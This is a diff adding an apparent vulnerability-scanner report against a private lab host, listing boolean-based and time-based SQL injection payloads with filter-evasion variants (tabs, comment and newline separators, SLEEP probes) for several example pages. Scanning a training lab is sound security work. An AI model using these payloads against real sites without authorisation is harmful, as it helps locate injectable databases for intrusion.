@@ -1,0 +1,104 @@
+Target: http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php (get)
+VulnName: 
+Query: {'name': "root'\tand\t'62049'='62049"}
+Payload: '	and	'62049'='62049
+'	and	'77453'='77453
+'	or	96007=96007#
+'	and	'8594'='8595
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example2.php (get)
+VulnName: 
+Query: {'name': "root'\tand\t'62049'='62049"}
+Payload: '	and	'62049'='62049
+'	and	'77453'='77453
+'	or	96007=96007#
+'	and	'8594'='8595
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example3.php (get)
+VulnName: 
+Query: {'name': "root'/**/and/**/'35298'='35298"}
+Payload: '/**/and/**/'35298'='35298
+'/**/and/**/'36281'='36281
+'/**/or/**/38308=38308#
+'/**/and/**/'4576'='4577
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example4.php (get)
+VulnName: 
+Query: {'id': '2\tand\t54319=54319'}
+Payload: 	and	54319=54319
+	and	55294=55294
+	or	89911=89911#
+	and	57602=57603
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example5.php (get)
+VulnName: 
+Query: {'id': '2\tand\t54319=54319'}
+Payload: 	and	54319=54319
+	and	55294=55294
+	or	89911=89911#
+	and	57602=57603
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example6.php (get)
+VulnName: 
+Query: {'id': "2'+and+'47201'='47201"}
+Payload: '+and+'47201'='47201
+'+and+'63883'='63883
+'+or+15948=15948#
+'+and+'27825'='27826
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example7.php (get)
+VulnName: 
+Query: {'id': '2\nand\n87102=87102'}
+Payload: 
+and
+87102=87102
+
+and
+29088=29088
+
+or
+14371=14371#
+
+and
+27101=27102
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example8.php (get)
+VulnName: 
+Query: {'order': 'name'}
+Payload: ` or SLEEP(3);-- 
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example9.php (get)
+VulnName: 
+Query: {'order': 'name'}
+Payload:  or SLEEP(3);-- 
+Advice: 
+---
+---
+URL:http://192.168.42.133/xml/example2.php (get)
+VulnName: 
+Query: {'name': "hacker'+and+'47201'='47201"}
+Payload: '+and+'47201'='47201
+'+and+'63883'='63883
+'+or+15948=15948#
+'+and+'27825'='27826
+Advice: 
+---
